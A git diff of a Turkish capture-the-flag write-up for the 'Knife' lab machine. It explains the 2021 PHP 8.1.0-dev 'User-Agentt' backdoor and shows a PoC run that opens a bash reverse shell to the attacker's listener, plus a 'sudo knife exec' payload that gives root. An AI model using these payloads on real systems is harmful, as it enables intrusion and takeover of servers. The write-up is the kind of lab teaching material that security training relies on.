@@ -1,19 +1,29 @@
 <img width="748" height="478" alt="1_5ONNUJOdKmVSmWXV_l8JdQ" src="https://github.com/user-attachments/assets/704cef28-7ca1-49a0-891f-d3ac6db0c24d" />
 
-About
-Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.
+## Hakkında
 
+Knife, üzerinde backdoor'lu (arka kapılı) bir PHP sürümünün çalıştığı bir uygulama barındıran, zorluk seviyesi düşük bir Linux makinesidir. Bu zafiyet, sunucuda ilk erişimi (foothold) elde etmek için kullanılır. Ardından bir sudo yanlış yapılandırması istismar edilerek root shell elde edilir.
 
+---
 
+## 1. Genel Bakış
 
-## Keşif
+Knife, HTB'nin "easy" seviye Linux kutularından biri. Zafiyet zinciri iki basit ama öğretici adımdan oluşuyor:
+
+1. Hedefte çalışan PHP sürümü, **2021'de yaşanan resmi PHP git sunucusu ihlali** sırasında koda enjekte edilen kötü amaçlı bir "backdoor" (arka kapı) içeriyor. Bu backdoor bir HTTP header üzerinden tetiklenip doğrudan komut çalıştırılmasına izin veriyor.
+2. `sudo -l` ile görülen bir **yanlış yapılandırma** (misconfiguration) — `james` kullanıcısı `knife` isimli aracı şifresiz ve root olarak çalıştırabiliyor. `knife`'ın kendi `exec` alt komutu keyfi Ruby/sistem kodu çalıştırmaya izin verdiği için doğrudan root shell'e çıkılıyor.
+
+Kısacası: **backdoor'lu yazılım sürümü → RCE → sudo misconfiguration → root**.
+
+---
+
+## 2. Keşif
 
 ```
 nmap -sS -A -p- -T5 10.129.50.161
 ```
 
 <img width="988" height="358" alt="nmap" src="https://github.com/user-attachments/assets/51abd303-9203-4e65-879f-f98f25696acc" />
-
 
 Web sitesine göz attım, sayfa içeriğinde ve kaynak kodda (`view-source`) dikkat çekici bir şey yoktu. `ffuf` ile dizin taraması denedim ama anlamlı bir sonuç çıkmadı. Bu noktada isteği Burp Suite ile yakalayıp response header'larına baktım
 
@@ -32,15 +42,15 @@ curl -v 10.129.50.161
 
 ---
 
-## Zafiyet Analizi — PHP 8.1.0-dev Backdoor (Mart 2021 PHP Git Olayı)
+## 3. Zafiyet Analizi — PHP 8.1.0-dev Backdoor (Mart 2021 PHP Git Olayı)
 
-### Arka Plan
+### 3.1 Arka Plan
 
 28 Mart 2021'de, PHP'nin kendi kaynak kod deposuna (o dönem `git.php.net` üzerinde barındırılıyordu) saldırganlar tarafından yetkisiz iki commit atıldı. Bu commit'ler, PHP'nin çekirdeğine (`zend_object` sınıflarını yönetim katmanına) kötü amaçlı bir kod parçası ekliyordu. Kod, HTTP isteklerinde **`User-Agentt`** (dikkat: normal `User-Agent` değil, sonunda fazladan bir "t" olan sahte bir header) adlı bir header arıyor, bu header'da `zerodium` string'i geçiyorsa header'ın geri kalan kısmını doğrudan `eval()` benzeri bir mekanizmayla PHP kodu olarak çalıştırıyordu.
 
 PHP ekibi olayı hızlıca fark etti, kötü niyetli commit'leri geri aldı ve kaynak kod deposunu tamamen GitHub'a taşıdı. Ancak bu backdoor'un test/geliştirme amaçlı derlenen bazı **PHP 8.1.0-dev** build'lerinde (o dönemin geliştirme dalı) kısa süreliğine gerçekten var olduğu görüldü.
 
-### İstismar Mantığı
+### 3.2 İstismar Mantığı
 
 Backdoor'un çalışma prensibi çok basit bir **header injection → code execution** zinciri:
 
@@ -52,7 +62,7 @@ Backdoor'un çalışma prensibi çok basit bir **header injection → code execu
 3. Bu header bulunursa ve içeriğinde `zerodium` kelimesi geçiyorsa, header'ın geri kalanı **PHP kodu olarak çalıştırılır** — bu tamamen sunucu tarafında, uygulamanın kendi kodundan bağımsız, doğrudan interpreter seviyesinde gerçekleşen bir RCE'dir.
 4. Yani bu, üstte çalışan web uygulamasının (Emergent Medical Idea sitesi) kodunda hiçbir hata olmasa bile çalışır — çünkü zafiyet uygulamada değil, **PHP interpreter'ının kendisinde**.
 
-### Pratikte İstismar
+### 3.3 Pratikte İstismar
 
 Bu zafiyeti otomatikleştiren hazır bir PoC var:
  
@@ -93,17 +103,15 @@ python3 reverseshell.py http://10.129.50.161/ 10.10.14.187 4444
 
 <img width="556" height="55" alt="reverseshell" src="https://github.com/user-attachments/assets/8a6e830e-28e4-4cf3-b17c-daa2b1ca9937" />
 
-
 Bu, hedefte arka planda çalışan PHP interpreter'ına, benim IP/port'uma bağlanan bir bash reverse shell komutu enjekte etti. Listener'da bağlantı geldi:
 
 <img width="647" height="105" alt="shell" src="https://github.com/user-attachments/assets/7f243f8a-fa33-4b69-bf81-5deb4dcb474d" />
-
 
 Doğrudan **`james`** kullanıcısı olarak tam bir shell elde ettim.
 
 ---
 
-## User Flag
+## 4. User Flag
 
 ```
 james@knife:/home$ cd james
@@ -113,10 +121,11 @@ james@knife:~$ cat user.txt
 
 <img width="296" height="57" alt="flag1" src="https://github.com/user-attachments/assets/1941df43-72a8-478b-b429-a0df994d4b52" />
 
+---
 
-## Privilege Escalation — `sudo knife exec`
+## 5. Privilege Escalation — `sudo knife exec`
 
-### Keşif
+### 5.1 Keşif
 
 Shell aldıktan sonraki standart refleks: `sudo -l`.
 
@@ -133,7 +142,7 @@ Bu çıktı bize şunu söylüyor: `james` kullanıcısı, **şifre girmeden (`N
 
 Bu klasik bir **sudo misconfiguration** — GTFOBins'de `knife` için tam olarak bu senaryo dokümante edilmiş: [gtfobins.github.io/gtfobins/knife](https://gtfobins.github.io/gtfobins/knife/).
 
-### GTFOBins Payload'ı ve Tırnak Mantığı
+### 5.2 GTFOBins Payload'ı ve Tırnak Mantığı
 
 GTFOBins'in önerdiği payload şu:
 
@@ -155,7 +164,7 @@ Ruby'de `exec` çağrısı, mevcut process'in yerini verilen komutla değiştiri
 
 Yani özetle iki farklı dilin (bash ve Ruby) tırnak kuralları iç içe geçiyor: **dıştaki tırnak "bunu bash olarak yorumlama, aynen Ruby yorumlayıcısına ilet" demek, içteki tırnak ise "bu bir Ruby string'i" demek.**
 
-### İlk Deneme ve Hata
+### 5.3 İlk Deneme ve Hata
 
 Yazıda belirttiğim gibi ilk denememde `sudo` eklemeyi unuttum:
 
@@ -165,7 +174,7 @@ knife exec -E "exec '/bin/sh'"
 
 Bu, `knife`'ı **`james` kullanıcısı yetkisiyle** çalıştırdı — yani `/bin/sh`'a geçtim ama hâlâ `james`'tim, root olmadım. Çünkü `sudo -l` çıktısındaki yetki sadece `sudo` üzerinden çalıştırıldığında geçerli; `knife`'ı doğrudan çağırırsam bu SUID bir binary değil, normal kullanıcı yetkimle çalışır.
 
-### Doğru Komut ve Root Shell
+### 5.4 Doğru Komut ve Root Shell
 
 `sudo` eklediğimde:
 
@@ -177,12 +186,11 @@ root
 
 <img width="778" height="372" alt="root" src="https://github.com/user-attachments/assets/44a665d7-bb17-46c9-86ca-e800576872ba" />
 
-
 Bu sefer `knife` süreci **root olarak** başlatıldı (çünkü `sudo` ile çağırdık ve `sudoers` dosyası bunu şifresiz izin veriyordu), Ruby yorumlayıcısı `exec '/bin/sh'` komutunu çalıştırdı ve bu **root yetkili process'i** doğrudan bir root shell'e dönüştürdü.
 
 ---
 
-##  Root Flag
+## 6. Root Flag
 
 ```
 # cd /root
